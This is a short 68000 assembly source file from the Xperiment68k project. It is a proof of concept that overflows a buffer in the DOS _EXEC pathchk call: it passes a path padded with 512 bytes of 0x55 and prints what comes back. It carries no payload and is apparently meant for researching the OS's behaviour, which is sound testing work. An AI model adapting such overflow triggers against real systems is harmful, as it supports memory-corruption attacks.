.title pathchk_bof2 - DOS _EXEC (md=2) buffer overflow PoC

;This file is part of Xperiment68k
;Copyright (C) 2025 TcbnErik
;
;This program is free software: you can redistribute it and/or modify
;it under the terms of the GNU General Public License as published by
;the Free Software Foundation, either version 3 of the License, or
;(at your option) any later version.
;
;This program is distributed in the hope that it will be useful,
;but WITHOUT ANY WARRANTY; without even the implied warranty of
;MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;GNU General Public License for more details.
;
;You should have received a copy of the GNU General Public License
;along with this program.  If not, see <https://www.gnu.org/licenses/>.

.include macro.mac
.include process.mac

.include xputil.mac


.cpu 68000
.text

Start:
  lea (FileBuffer,pc),a1
  lea (PSP_Drive,a0),a2
  STRCPY a2,a1,-1
  lea (PSP_Filename,a0),a2
  STRCPY a2,a1,-1
  move.b #' ',(a1)+

  moveq #$55,d0
  move #512/2-1,d1
  @@:
    move.b d0,(a1)+
    move.b d0,(a1)+
  dbra d1,@b
  clr.b (a1)

  DOS_PRINT (File,pc)
  DOS_PRINT (FileBuffer,pc)
  DOS_PRINT_CRLF

  DOS_PRINT (strCallPathchk,pc)

  clr.l -(sp)
  pea (CmdlineBuffer,pc)
  pea (FileBuffer,pc)
  move #EXECMODE_PATHCHK,-(sp)
  DOS _EXEC
  lea (14,sp),sp
  move.l d0,d7

  bsr PrintD0$4_4
  DOS_PRINT_CRLF

  tst.l d7
  bmi @f
    DOS_PRINT (File,pc)
    DOS_PRINT (FileBuffer,pc)
    DOS_PRINT_CRLF

    DOS_PRINT (CmdlineLen,pc)
    move.b (CmdlineBuffer,pc),d0
    bsr Print$2
    DOS_PRINT_CRLF

    DOS_PRINT (CmdlineStr,pc)
    DOS_PRINT (CmdlineBuffer+1,pc)
    DOS_PRINT_CRLF
  @@:
  DOS _EXIT


  DEFINE_PRINT$2 Print$2
  DEFINE_PRINTD0$4_4 PrintD0$4_4


.data

File: .dc.b 'file: ',0
CmdlineLen: .dc.b 'cmdline length: ',0
CmdlineStr: .dc.b 'cmdline string: ',0

strCallPathchk:
  .dc.b 'DOS _EXEC(md=2;pathchk)を実行します。',CR,LF,0


.bss
.even

FileBuffer: .ds.b 1024
CmdlineBuffer: .ds.b 1024


.end
